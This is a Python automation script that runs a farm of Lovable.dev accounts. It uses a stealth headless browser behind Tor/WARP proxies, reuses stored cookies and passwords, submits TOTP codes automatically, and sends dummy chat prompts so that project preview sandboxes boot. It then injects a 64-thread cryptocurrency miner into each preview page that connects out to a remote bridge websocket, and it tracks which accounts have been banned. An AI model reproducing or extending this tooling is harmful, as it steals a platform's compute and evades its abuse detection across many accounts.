#!/usr/bin/env python3
"""
Script 3: Session Runner
Load session → Connect → Start worker → Health check

Usage:
  python3 script3_launch_miner.py --session 1 --mode oneshot --project 498c08a9-...  # farm system (default)
  python3 script3_launch_miner.py --session 3 --mode full --db mega                    # legacy chimera Mega DB
  python3 script3_launch_miner.py --session 3 --mode gh --db github                    # git push state to repo

DB backends (--db):
  local   farm system on disk, no Mega, no push (default).
          Sessions: <sessions-dir>/session-N/{config.json,cookies.json}
          Projects: session config project_id/project_link + finals/lovables.json.
  mega    legacy chimera Mega DB (mega:chimera/database.json via rclone).
  github  local farm reads/writes PLUS git commit+push of the repo state
          after every status change. GH token is NEVER committed: set
          GH_TOKEN env, or store encrypted via
          `CHIMERA_GH_KEY=<key> python3 db_backend.py encrypt-token`
          (decrypted at runtime from ~/.config/chimera/gh_token.enc).
"""

import asyncio
import argparse
import json
import os
import sys
from pathlib import Path

# Add paths (env-configurable for CI runners)
TOOLKIT_CORE = os.environ.get(
    "CHIMERA_TOOLKIT_CORE", "/home/alan/Documents/automation-toolkit/finals/core"
)
sys.path.insert(0, TOOLKIT_CORE)
sys.path.insert(0, str(Path(__file__).resolve().parent))

from invisible_playwright.async_api import InvisiblePlaywright
from db_backend import build_backend
from miner_injector import inject_miner, health_check_loop, is_tab_alive, restore_tab

SESSIONS_DIR = Path(
    os.environ.get(
        "CHIMERA_SESSIONS_DIR",
        "/home/alan/Documents/repos/automation-toolkit/scripts/sessions",
    )
)
FINALS_DIR = Path(
    os.environ.get(
        "CHIMERA_FINALS_DIR",
        "/home/alan/Documents/repos/automation-toolkit/finals",
    )
)
BRIDGE_URL = "wss://bridge-production-7c63.up.railway.app"

LOGIN_URL = "https://lovable.dev/login"
DASHBOARD_MARKERS = ["/projects", "/dashboard"]


def resolve_proxy() -> dict | None:
    """Pick a TOR->WARP chain proxy: PROXY_PORT env first, else scan 9051-9054, 9050, 40000."""
    import socket
    forced = os.environ.get("PROXY_PORT")
    ports = [int(forced)] if forced else [9051, 9052, 9053, 9054, 9050, 40000]
    for port in ports:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=2):
                proxy = {"server": f"socks5://127.0.0.1:{port}"}
                print(f"✅ Using proxy 127.0.0.1:{port}", file=sys.stderr)
                return proxy
        except OSError:
            continue
    print("⚠️  No proxy found (TOR/WARP not running); direct connection.", file=sys.stderr)
    return None


async def mark_truly_red(session_id: str, session_key: str, config: dict, reason: str, backend=None):
    """Flag a session as truly_red in config.json and the active backend DB."""
    print(f"\n💀 Session bounced out of dashboard - marking TRULY RED ({reason})")
    try:
        config["status"] = "truly_red"
        config["flag_reason"] = reason
        with open(SESSIONS_DIR / f"session-{session_id}" / "config.json", "w") as f:
            json.dump(config, f, indent=2)
    except Exception as e:
        print(f"⚠️  Failed to write config.json: {e}")
    if backend is None:
        return
    try:
        if backend.get_session(session_key):
            backend.update_session(session_key, status="truly_red", flag_reason=reason)
        backend.persist([str(SESSIONS_DIR / f"session-{session_id}" / "config.json")])
    except Exception as e:
        print(f"⚠️  Failed to flag truly_red in DB: {e}")


async def relogin_session(browser, config: dict, session_id: str, backend=None) -> str:
    """Attempt normal email+password login in a FRESH context (mirrors script2/revive).

    On success, overwrites the session's cookies.json with fresh cookies.
    Cookie sync follows the backend: mega → rclone upload, github → git
    commit+push, local → disk only.
    Returns: "ok" (logged in + cookies saved), "lost" (invalid credentials - account dead),
             "failed" (other error)
    """
    email = config.get("email", "")
    password = config.get("password", email)

    context = await browser.new_context()
    page = await context.new_page()

    LOST_SELECTORS = [
        '[data-slot="field-error"]',
        '[id$="-form-item-message"]',
        '.ant-form-item-explain-error',
        'text=The provided credentials are invalid',
        'text=Invalid email or password',
        'text=Incorrect password',
        'text=Wrong email or password',
        'text=Invalid credentials',
    ]

    async def check_lost() -> bool:
        for selector in LOST_SELECTORS:
            try:
                el = await page.wait_for_selector(selector, timeout=2500)
                if el and await el.is_visible():
                    print(f"   ⚠️  INVALID CREDENTIALS error shown ({selector})")
                    return True
            except:
                continue
        return False

    async def save_fresh_cookies():
        cookies = await context.cookies()
        session_path = SESSIONS_DIR / f"session-{session_id}"
        with open(session_path / "cookies.json", "w") as f:
            json.dump(cookies, f, indent=2)
        print(f"   ✅ Cookies overwritten ({len(cookies)} cookies)")
        backend_name = getattr(backend, "name", "local") if backend is not None else "local"
        if backend_name == "mega":
            try:
                import subprocess
                proxy_vars = ["http_proxy", "https_proxy", "all_proxy", "HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY", "no_proxy", "NO_PROXY"]
                env = {k: v for k, v in os.environ.items() if k not in proxy_vars}
                remote = f"mega:lovable_sessions/session-{session_id}/cookies.json"
                res = subprocess.run(
                    ["rclone", "copyto", str(session_path / "cookies.json"), remote],
                    capture_output=True, text=True, timeout=60, env=env,
                )
                if res.returncode == 0:
                    print(f"   ✅ Cookies uploaded to Mega ({remote})")
                else:
                    print(f"   ⚠️  Mega cookies upload failed: {res.stderr[:200]}")
            except Exception as e:
                print(f"   ⚠️  Mega cookies upload error: {e}")
        elif backend_name == "github" and backend is not None:
            try:
                backend.persist([str(session_path / "cookies.json")])
            except Exception as e:
                print(f"   ⚠️  GitHub cookies push error: {e}")

    try:
        print(f"   🌐 Re-login: opening {LOGIN_URL}")
        await page.goto(LOGIN_URL, timeout=60000)
        await page.wait_for_load_state("domcontentloaded", timeout=30000)
        await asyncio.sleep(4)

        # Already logged in?
        if any(m in page.url for m in DASHBOARD_MARKERS):
            print("   ✅ Already logged in")
            await save_fresh_cookies()
            return "ok"

        # Find email input
        email_input = None
        for selector in ['input[type="email"]', 'input[name="email"]', 'input[autocomplete="email"]', 'input[placeholder*="mail"]']:
            try:
                email_input = await page.wait_for_selector(selector, timeout=8000, state="visible")
                if email_input:
                    break
            except:
                continue

        if not email_input:
            print("   ❌ Email input not found")
            return "failed"

        print(f"   📧 Filling email: {email}")
        await email_input.fill(email)
        await asyncio.sleep(0.5)

        # Click Continue / Sign in (first step) - EXACT match, never the Google button
        for btn_text in ["Continue", "Sign in", "Sign In", "Login", "Next"]:
            try:
                btn = page.get_by_role("button", name=btn_text, exact=True).first
                if await btn.is_visible():
                    await btn.click()
                    print(f"   🖱️  Clicked '{btn_text}'")
                    break
            except:
                continue
        else:
            print("   ⌨️  No exact button found - pressing Enter on email field")
            await email_input.press("Enter")

        await asyncio.sleep(8)

        # Find password input (some flows reveal it after email step)
        password_input = None
        for selector in ['input[placeholder="Password"]', 'input[type="password"]', 'input[name="password"]', 'input[autocomplete="current-password"]']:
            try:
                password_input = await page.wait_for_selector(selector, timeout=12000, state="visible")
                if password_input:
                    break
            except:
                continue

        if not password_input:
            if any(m in page.url for m in DASHBOARD_MARKERS):
                print("   ✅ Logged in after email step")
                await save_fresh_cookies()
                return "ok"
            print("   ❌ Password input not found")
            return "failed"

        print(f"   🔑 Filling password")
        await password_input.fill(password)
        await asyncio.sleep(0.5)

        for btn_text in ["Sign in", "Sign In", "Login", "Log in", "Continue", "Submit"]:
            try:
                btn = page.get_by_role("button", name=btn_text, exact=True).first
                if await btn.is_visible():
                    await btn.click()
                    print(f"   🖱️  Clicked '{btn_text}'")
                    break
            except:
                continue
        else:
            print("   ⌨️  No exact button found - pressing Enter on password field")
            await password_input.press("Enter")

        # Wait for dashboard (up to 90s), checking for invalid-credentials errors.
        # Lovable 2FA accounts land on a TOTP prompt first — handle via local secret.
        print("   ⏳ Waiting for dashboard...")
        totp_tried = False
        for _ in range(18):
            await asyncio.sleep(5)
            if await check_lost():
                print("   💀 Account is LOST (invalid credentials)")
                return "lost"
            if any(m in page.url for m in DASHBOARD_MARKERS):
                print("   ✅ Logged in!")
                await save_fresh_cookies()
                return "ok"
            if not totp_tried:
                try:
                    txt = (await page.content()).lower()
                except Exception:
                    txt = ""
                if "verification code" in txt or "two-factor" in txt or "authenticator" in txt:
                    totp_tried = True
                    secrets = [config.get("totp_secret"), config.get("totp_secret_backup")]
                    for sec in [s for s in secrets if s]:
                        try:
                            import pyotp

                            code = pyotp.TOTP(sec).now()
                            print("   🔑 Submitting TOTP code")
                            inp = page.locator(
                                'input[inputmode="numeric"], input[autocomplete="one-time-code"], '
                                'input[type="text"], input:not([type])'
                            ).first
                            try:
                                await inp.wait_for(state="visible", timeout=8000)
                                await inp.fill(code)
                            except Exception:
                                await page.evaluate(
                                    """(code) => {
                                    const el = document.querySelector('#totp-code') || [...document.querySelectorAll('input')].find(i=>/code|token|otp|auth/i.test((i.placeholder||'')+(i.name||'')+(i.id||''))) || [...document.querySelectorAll('input')].find(i=>i.offsetParent!==null);
                                    if(!el) throw new Error('no totp input');
                                    el.focus();
                                    document.execCommand('selectAll', false, null);
                                    document.execCommand('insertText', false, code); }""",
                                    code,
                                )
                            await asyncio.sleep(1)
                            try:
                                await page.get_by_role("button", name="Verify").click(timeout=5000)
                            except Exception:
                                await page.locator('[data-testid="auth-submit-button"]').click()
                            break
                        except Exception as e:
                            print(f"   ⚠️  TOTP attempt error: {str(e)[:100]}")
                            continue

        print("   ❌ Re-login did not reach dashboard")
        return "failed"

    except Exception as e:
        print(f"   ❌ Re-login error: {e}")
        return "failed"
    finally:
        try:
            await page.close()
        except:
            pass
        try:
            await context.close()
        except:
            pass


async def load_session_cookies(session_id: str):
    """Load session cookies from disk."""
    session_path = SESSIONS_DIR / f"session-{session_id}"
    
    if not session_path.exists():
        raise FileNotFoundError(f"Session session-{session_id} not found")
    
    with open(session_path / "config.json") as f:
        config = json.load(f)
    
    with open(session_path / "cookies.json") as f:
        cookies = json.load(f)
    
    return config, cookies


async def accept_invite(page, invite_link: str) -> bool:
    """Accept project invitation."""
    try:
        print(f"📨 Accepting invite: {invite_link}")
        await page.goto(invite_link, timeout=30000)
        await asyncio.sleep(3)
        
        # Look for accept button
        accept_selectors = [
            'button:has-text("Accept")',
            'button:has-text("Join")',
            'button:has-text("Continue")',
            '[role="button"]:has-text("Accept")'
        ]
        
        for selector in accept_selectors:
            try:
                button = await page.wait_for_selector(selector, timeout=5000)
                if button:
                    await button.click()
                    print("✅ Clicked accept button")
                    await asyncio.sleep(3)
                    return True
            except:
                continue
        
        # If no button found, might already be accepted
        if "projects/" in page.url:
            print("✅ Already accepted or no button needed")
            return True
        
        print("⚠️  Could not find accept button, but continuing...")
        return True
        
    except Exception as e:
        print(f"❌ Accept invite failed: {e}")
        return False


async def goto_retry(page, url, timeout_ms=30000, tries=3):
    """goto with retries - Tor/WARP links drop page loads; an unhandled
    timeout used to kill the whole session run."""
    for attempt in range(1, tries + 1):
        try:
            await page.goto(url, timeout=timeout_ms)
            return True
        except Exception as e:
            print(f"   ⚠️  goto failed (attempt {attempt}/{tries}): {e}")
            if attempt == tries:
                raise
            await asyncio.sleep(5 * attempt)
    return False


async def check_session_valid(page) -> bool:
    """Check if session is still valid (not expired)."""
    try:
        current_url = page.url
        
        # If redirected to login/auth, session is expired
        if "login" in current_url or "auth" in current_url:
            return False
        
        return True
    except:
        return False


async def wait_for_console_message(page, timeout_seconds=300):
    """Wait for 'lovable' message in console by refreshing every 40 seconds.

    Returns "ready" | "timeout" | "rep-prompt" (3 error pages = dev server
    needs a fresh chat prompt, not more refreshes)."""
    print(f"⏳ Waiting for console 'lovable' message (refreshing every 40s, max {timeout_seconds}s)...")

    start_time = asyncio.get_event_loop().time()
    refresh_interval = 40
    error_hits = 0
    
    while True:
        elapsed = asyncio.get_event_loop().time() - start_time

        if elapsed > timeout_seconds:
            print(f"⚠️  Timeout waiting for console message after {timeout_seconds}s")
            return "timeout"
        
        # Check console logs
        try:
            # Evaluate in page to check if the doc bridge (subprocess feature) is ready.
            # window.lovable/webcontainer exist on the shell page immediately - the
            # bridge being a callable function is the real "sandbox usable" signal.
            result = await page.evaluate("""
                () => {
                    if (window.doc && typeof window.doc === 'function') {
                        return true;
                    }
                    return false;
                }
            """)
            
            if result:
                print(f"✅ Console shows lovable is ready! (after {int(elapsed)}s)")
                return "ready"
        except Exception as e:
            print(f"   ⚠️  Console check error: {e}")
        
        # Fast path: error pages (502/proxy error/snag) mean container still
        # booting — refresh aggressively until gone, then inject.
        try:
            body = (await page.content()).lower()
            error_page = any(
                m in body
                for m in ["proxy error", ">502", "we hit a snag", "error 502"]
            )
        except Exception:
            error_page = False
        if error_page:
            error_hits += 1
            print(f"   🔄 Error page hit #{error_hits}, fast refresh... ({int(elapsed)}s elapsed)")
            if error_hits >= 3:
                print("   💬 3 error pages — dev server needs a fresh prompt, not refreshes")
                return "rep-prompt"
            try:
                await page.reload(timeout=30000)
                await asyncio.sleep(5)
            except Exception as e:
                print(f"   ⚠️  Refresh error: {e}")
            await asyncio.sleep(10)
            continue

        # Dead tab (crash)? Restore it instead of hammering reload.
        try:
            if not await is_tab_alive(page):
                print("   💥 Tab crashed — restoring before refresh...")
                await restore_tab(page, page.url)
                await asyncio.sleep(5)
                continue
        except Exception as e:
            print(f"   restore warn: {str(e)[:100]}")
        # Refresh page
        print(f"   🔄 Refreshing page... ({int(elapsed)}s elapsed)")
        try:
            await page.reload(timeout=30000)
            await asyncio.sleep(5)
        except Exception as e:
            print(f"   ⚠️  Refresh error: {e}")

        # Wait before next check
        await asyncio.sleep(refresh_interval)


async def verify_session_projects(session_id: int, db):
    """Open every project's chat link with this session's cookies and stamp linked=true/false."""
    session_key = f"session-{session_id}"
    projects = db.projects_for(session_key)
    
    if not projects:
        print(f"❌ No projects found for {session_key}")
        return
    
    print(f"\n🔍 Verifying {len(projects)} projects for {session_key}...")
    
    config, cookies = await load_session_cookies(session_id)
    
    proxy = resolve_proxy()
    async with InvisiblePlaywright(
        headless=False,
        proxy=proxy,
        humanize=True,
        locale='en-US',
    ) as browser:
        context = browser.contexts[0] if browser.contexts else await browser.new_context()
        await context.add_cookies(cookies)
        
        chat_selectors = [
            'div[contenteditable="true"][role="textbox"]',
            '[contenteditable="true"]',
            'textarea[placeholder*="chat"]',
            'textarea',
        ]
        
        for p in projects:
            url = p.get("chat_url") or f"https://lovable.dev/projects/{p['project_id']}"
            print(f"\n🔍 {p['project_id']} ({p.get('mode')}) → {url}")
            page = await context.new_page()
            try:
                await page.goto(url, timeout=30000)
                await asyncio.sleep(5)
                
                if "login" in page.url.lower() or "auth" in page.url.lower():
                    print(f"   ❌ LOGIN REDIRECT - session expired")
                    p["linked"] = False
                    db.mark_session_red(session_key)
                else:
                    found = False
                    for selector in chat_selectors:
                        try:
                            el = await page.wait_for_selector(selector, timeout=8000, state='visible')
                            if el and await el.is_visible():
                                found = True
                                break
                        except:
                            continue
                    p["linked"] = found
                    print(f"   {'✅ LINKED (chat editor found)' if found else '❌ NOT LINKED (no chat editor)'}")
            except Exception as e:
                p["linked"] = False
                print(f"   ❌ Error: {e}")
            await page.close()

    try:
        for p in projects:
            db.set_project_linked(p["project_id"], p.get("linked", False))
        db.persist()
    except Exception as e:
        print(f"⚠️  Failed to stamp verification results: {e}")
    print("\n=== VERIFICATION RESULTS ===")
    for p in projects:
        print(f"  {p['project_id']}: linked={p.get('linked')} mode={p.get('mode')}")


async def main():
    parser = argparse.ArgumentParser(description="Script 3: Session Runner")
    parser.add_argument("--session", type=str, required=True, help="Session number or ID (3, session-3, or 31959887265-1-1786899376)")
    parser.add_argument("--mode", choices=["oneshot", "full", "gh", "verify"], default="full", help="Health check mode (gh = stop after 4h40m-5h30m, verify = stamp linked projects)")
    parser.add_argument("--warp", action="store_true", help="Use WARP proxy (not implemented yet)")
    parser.add_argument("--project", help="Optional: specify project ID to use")
    parser.add_argument("--threads", type=int, default=64, help="Worker threads (default: 64)")
    parser.add_argument("--db", choices=["local", "mega", "github"], default="local",
                        help="State backend: local farm disk (default, no Mega), mega (legacy chimera DB), github (local + git push)")
    parser.add_argument("--sessions-dir", default=None,
                        help="Sessions dir (default: farm scripts/sessions, or CHIMERA_SESSIONS_DIR)")
    parser.add_argument("--repo", default=None,
                        help="Repo path for --db github (default: automation-toolkit repo)")
    parser.add_argument("--gh-token-file", default=None,
                        help="Encrypted GH token file for --db github (default ~/.config/chimera/gh_token.enc)")

    args = parser.parse_args()

    global SESSIONS_DIR
    if args.sessions_dir:
        SESSIONS_DIR = Path(args.sessions_dir)
    
    # Normalize session: strip optional "session-" prefix so both "3" and
    # "session-3" and GH-style "31959887265-1-1786899376" all work.
    args.session = args.session.strip()
    if args.session.startswith("session-"):
        args.session = args.session[len("session-"):]
    if not args.session:
        parser.error("empty session ID")
    
    print("=" * 60)
    print("🚀 SCRIPT 3: SESSION RUNNER")
    print("=" * 60)
    print(f"Session: session-{args.session}")
    print(f"Mode: {args.mode}")
    print(f"WARP: {'Yes' if args.warp else 'No'}")
    print(f"Threads: {args.threads}")
    print(f"DB: {args.db} (sessions: {SESSIONS_DIR})")
    print("=" * 60 + "\n")

    # 1. Load state backend (local farm disk by default — no Mega)
    print(f"📥 Loading {args.db} database...")
    db = build_backend(args.db, sessions_dir=str(SESSIONS_DIR),
                       finals_dir=str(FINALS_DIR), repo=args.repo,
                       gh_token_file=args.gh_token_file)
    db.print_stats()
    
    if args.mode == "verify":
        await verify_session_projects(args.session, db)
        return
    
    # 2. Get session
    session_id = f"session-{args.session}"
    session = db.get_session(session_id)
    
    if not session:
        print(f"⚠️  Session {session_id} not in database, checking disk...")
        try:
            config, cookies = await load_session_cookies(args.session)
            email = config.get("email", "unknown")
            print(f"✅ Found session on disk: {email}")
            
            # Add to database
            db.add_session(session_id, email, "active")
            session = db.get_session(session_id)
        except Exception as e:
            print(f"❌ Session {session_id} not found: {e}")
            return
    
    if session.get("status") in ("red", "truly_red"):
        print(f"❌ Session {session_id} is FLAGGED ({session.get('status')})")
        print("   Skipping...")
        return
    
    print(f"✅ Session: {session['email']} (status: {session['status']})")
    
    # 3. Get project owned by this session (lowest usage)
    if args.project:
        project = db.get_project(args.project)
        if not project:
            # Farm system: explicit --project wins even if no DB record exists
            # (records only track the latest remix). Build the record from the
            # session config when it matches, else construct it directly.
            pid = args.project.strip().rstrip("/")
            if "/projects/" in pid:
                pid = pid.split("/projects/")[-1].split("?")[0].strip()
            try:
                _cfg, _ = await load_session_cookies(args.session)
            except Exception:
                _cfg = {}
            if _cfg.get("project_id") == pid:
                print(f"✅ Project {pid} matches session config (latest remix)")
            else:
                print(f"⚠️  Project {pid} has no DB record — using it directly (explicit --project)")
            _cfg_link = _cfg.get("project_link") or ""
            if pid not in _cfg_link:
                _cfg_link = ""  # config tracks the latest remix, not this pid
            project = {
                "project_id": pid,
                "chat_url": _cfg_link or f"https://lovable.dev/projects/{pid}",
                "preview_url": f"https://{pid}.lovableproject.com",
                "invite_link": None,
                "created_by": session_id,
                "usage_count": 0,
                "max_usage": 20,
            }
        # Verify ownership
        elif project.get("created_by") != session_id:
            print(f"⚠️  Warning: Project {args.project} was created by {project.get('created_by')}, not {session_id}")
    else:
        # Get project linked to THIS account (template-created, not external invites)
        project = db.get_account_linked_project(session_id)
        if not project:
            print(f"❌ No account-linked projects for {session_id}")
            print(f"   Create projects first: python3 script2_remix_link.py --session {args.session} --count 3")
            return
    
    print(f"✅ Using project: {project['project_id']}")
    print(f"   Created by: {project.get('created_by')}")
    print(f"   Usage: {project['usage_count']}/{project['max_usage']}")
    
    # 4. Mark account ON_HOLD (no usage increment - prevents concurrent use of the account)
    prev_status = session.get("status", "active")
    db.update_session(session_id, status="on_hold")

    db.persist()

    # 5. Load session cookies
    print(f"\n📂 Loading session cookies...")
    try:
        config, cookies = await load_session_cookies(args.session)
    except Exception as e:
        print(f"❌ Failed to load session: {e}")
        db.mark_session_red(session_id)
        db.persist()
        return
    
    # 6. Start browser
    print("\n🌐 Starting browser...")
    
    try:
        proxy = resolve_proxy()
        # headed for local runs so the operator can watch (set HEADLESS=1 to force headless)
        _headed = os.environ.get("HEADLESS", "0") != "1"
        async with InvisiblePlaywright(
            headless=not _headed,
            proxy=proxy,
            humanize=_headed,
            locale='en-US',
        ) as browser:
            context = browser.contexts[0] if browser.contexts else await browser.new_context(viewport={"width": 1280, "height": 720})
            
            # Create chat page
            chat_page = await context.new_page()
            await context.add_cookies(cookies)
            
            # 7. Go STRAIGHT to chat (no invite acceptance - it's our own project)
            chat_url = project.get("chat_url", f"https://lovable.dev/projects/{project['project_id']}")
            print(f"\n📝 Going to chat: {chat_url}")
            await goto_retry(chat_page, chat_url)
            await asyncio.sleep(1)
            
            # Check if session is valid
            relogin_done = False
            if not await check_session_valid(chat_page):
                print("🔑 Session expired (redirected to login) - attempting re-login with stored credentials...")
                cfg = config
                cfg.setdefault("session_id", args.session)
                result = await relogin_session(browser, cfg, args.session, db)
                relogin_done = True
                if result == "ok":
                    print("✅ Re-login OK - retrying chat with fresh cookies")
                    fresh = json.load(open(SESSIONS_DIR / f"session-{args.session}" / "cookies.json"))
                    try:
                        await context.clear_cookies()
                    except:
                        pass
                    await context.add_cookies(fresh)
                    await goto_retry(chat_page, chat_url)
                    await asyncio.sleep(2)
                    if not await check_session_valid(chat_page):
                        print("❌ Still redirected to login after re-login")
                        await mark_truly_red(args.session, session_id, cfg,
                                             "redirected to login after successful re-login", db)
                        return
                else:
                    if result == "lost":
                        await mark_truly_red(args.session, session_id, cfg, "invalid credentials - account lost", db)
                        return
                    print(f"   ⚠️  Re-login flaked ({result}) — NOT flagging red, aborting run")
                    return
            
            # 8. Find chat input and send SIMPLE prompt immediately
            print("💬 Finding chat input...")
            
            chat_selectors = [
                'div[contenteditable="true"][role="textbox"]',
                '[contenteditable="true"]',
                'textarea[placeholder*="chat"]',
                'textarea',
            ]
            
            chat_input = None
            for selector in chat_selectors:
                try:
                    chat_input = await chat_page.wait_for_selector(selector, timeout=5000, state='visible')
                    if chat_input:
                        is_visible = await chat_input.is_visible()
                        is_enabled = await chat_input.is_enabled()
                        if is_visible and is_enabled:
                            print(f"✅ Found chat input")
                            break
                        else:
                            chat_input = None
                except:
                    continue
            
            if not chat_input and not relogin_done:
                print("🔑 No chat input - session may be stale, attempting re-login...")
                try:
                    shot = f"/tmp/script3_error_{args.session}_{project['project_id']}_no_input.png"
                    await chat_page.screenshot(path=shot, full_page=True)
                    print(f"📸 Screenshot saved to {shot}")
                except Exception as e:
                    print(f"⚠️ Screenshot failed: {e}")
                cfg = config
                cfg.setdefault("session_id", args.session)
                result = await relogin_session(browser, cfg, args.session, db)
                if result == "ok":
                    print("✅ Re-login OK - retrying chat with fresh cookies")
                    fresh = json.load(open(SESSIONS_DIR / f"session-{args.session}" / "cookies.json"))
                    try:
                        await context.clear_cookies()
                    except:
                        pass
                    await context.add_cookies(fresh)
                    await goto_retry(chat_page, chat_url)
                    await asyncio.sleep(2)
                    for selector in chat_selectors:
                        try:
                            chat_input = await chat_page.wait_for_selector(selector, timeout=5000, state='visible')
                            if chat_input:
                                is_visible = await chat_input.is_visible()
                                is_enabled = await chat_input.is_enabled()
                                if is_visible and is_enabled:
                                    print(f"✅ Found chat input after re-login")
                                    break
                                else:
                                    chat_input = None
                        except:
                            continue
                    if not chat_input:
                        print("❌ Still no chat input after re-login")
                        try:
                            shot = f"/tmp/script3_error_{args.session}_{project['project_id']}_no_input_after_relogin.png"
                            await chat_page.screenshot(path=shot, full_page=True)
                            print(f"📸 Screenshot saved to {shot}")
                        except Exception as e:
                            print(f"⚠️ Screenshot failed: {e}")
                        return
                else:
                    if result == "lost":
                        await mark_truly_red(args.session, session_id, cfg, "invalid credentials - account lost", db)
                        return
                    print(f"   ⚠️  Re-login flaked ({result}) — NOT flagging red, aborting run")
                    return
            elif not chat_input:
                print("❌ Could not find chat input")
                try:
                    shot = f"/tmp/script3_error_{args.session}_{project['project_id']}_no_input.png"
                    await chat_page.screenshot(path=shot, full_page=True)
                    print(f"📸 Screenshot saved to {shot}")
                except Exception as e:
                    print(f"⚠️ Screenshot failed: {e}")
                return
            
            # Send simple prompt
            import random
            simple_prompts = ["say 'a'", "1+1?", "say 'x'", "2+2?"]
            prompt = random.choice(simple_prompts)
            
            print(f"💬 Sending prompt: '{prompt}'")
            await chat_input.fill(prompt)
            await asyncio.sleep(0.3)
            await chat_page.keyboard.press("Enter")
            print("✅ Prompt sent!")
            
            # 9. SAME TAB to preview (single-tab flow: chat -> preview in
            # one tab, halves RAM and matches the manual game)
            print("\n🖼️  Going to preview (same tab)...")
            preview_url = project.get("preview_url", f"https://{project['project_id']}.lovableproject.com")
            preview_page = chat_page
            await goto_retry(preview_page, preview_url)
            await asyncio.sleep(3)
            print(f"✅ Preview opened: {preview_url}")

            async def fresh_preview_tab():
                """Corpse recovery: the tab may be unrestorable in place —
                open a brand-new tab on the preview URL."""
                try:
                    print("   💥 corpse tab — opening fresh preview tab...")
                    try:
                        await preview_page.close()
                    except Exception:
                        pass
                    fresh = await asyncio.wait_for(context.new_page(), timeout=30)
                    await goto_retry(fresh, preview_url)
                    await asyncio.sleep(3)
                    return fresh
                except Exception as e:
                    print(f"   fresh tab failed: {str(e)[:100]}")
                    return None

            async def reprompt_and_wait():
                """Back to chat (same tab), fresh prompt, back to preview,
                wait for console. Returns wait status string."""
                print("🔄 Back to chat for a fresh prompt...")
                await goto_retry(preview_page, chat_url)
                await asyncio.sleep(3)
                _input = None
                for selector in chat_selectors:
                    try:
                        _input = await preview_page.wait_for_selector(selector, timeout=5000, state='visible')
                        if _input and await _input.is_visible():
                            break
                    except Exception:
                        _input = None
                if _input:
                    await _input.fill(random.choice(simple_prompts))
                    await preview_page.keyboard.press("Enter")
                    print("✅ Sent new prompt, waiting again...")
                await goto_retry(preview_page, preview_url)
                await asyncio.sleep(3)
                return await wait_for_console_message(preview_page, timeout_seconds=300)

            # 10. Wait for console 'lovable' message (refresh every 40s).
            # 3 error pages -> "rep-prompt": refreshes won't fix it, the dev
            # server wants a fresh chat prompt -> re-prompt, then continue.
            console_ready = await wait_for_console_message(preview_page, timeout_seconds=300)

            if console_ready == "rep-prompt":
                console_ready = await reprompt_and_wait()

            if console_ready != "ready":
                print("❌ Console message never appeared")
                if args.mode == "oneshot":
                    print("🔄 Oneshot: one fresh-tab retry before giving up...")
                    _fresh = await fresh_preview_tab()
                    if _fresh is not None:
                        preview_page = _fresh
                        console_ready = await wait_for_console_message(
                            preview_page, timeout_seconds=180)
                        if console_ready == "rep-prompt":
                            console_ready = await reprompt_and_wait()
                    if console_ready != "ready":
                        print("🛑 Oneshot mode - exiting")
                        return
                else:
                    console_ready = await reprompt_and_wait()

                    if console_ready != "ready":
                        print("🔄 Last resort: fresh tab...")
                        _fresh = await fresh_preview_tab()
                        if _fresh is not None:
                            preview_page = _fresh
                            console_ready = await wait_for_console_message(
                                preview_page, timeout_seconds=180)
                    if console_ready != "ready":
                        print("❌ Still no console message after retry - giving up")
                        return
            
            # 11. Start worker
            print("\n⚙️ Starting worker...")
            success = await inject_miner(preview_page, BRIDGE_URL, args.threads)
            
            if not success:
                print("❌ Worker start failed")
                if args.mode == "oneshot":
                    return
            
            print("\n✅ Worker is running!")
            
            # 12. Health check loop (refresh every 3min, check for errors)
            print(f"\n🏥 Starting health check ({args.mode} mode)...")
            
            max_runtime = None
            if args.mode == "gh":
                import random as _random
                max_runtime = _random.uniform(280, 330)
                print(f"⏰ GH mode: will stop after {max_runtime:.1f} minutes")
            
            # Oneshot = keep checking until preview stops loading (error on page), then end
            await health_check_loop(preview_page, preview_url, mode=args.mode, bridge_url=BRIDGE_URL, context=context, max_runtime_minutes=max_runtime)
            print("\n🏁 Session complete!")
    finally:
        # Release the account (never leave it on_hold) - but NEVER un-flag red/truly_red
        cur_status = db.get_session(session_id)
        if cur_status and cur_status.get("status") in ("red", "truly_red"):
            print(f"⚠️  Session {session_id} is {cur_status.get('status')} - not restoring to active")
        else:
            db.update_session(session_id, status="active")
            db.persist()
            print(f"✅ Session {session_id} released back to 'active'")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n⚠️  Interrupted by user")
    except Exception as e:
        print(f"\n❌ Fatal error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        # Hard kill - never leave the process/browser hanging
        print("\n💥 Exiting process")
        os._exit(0)
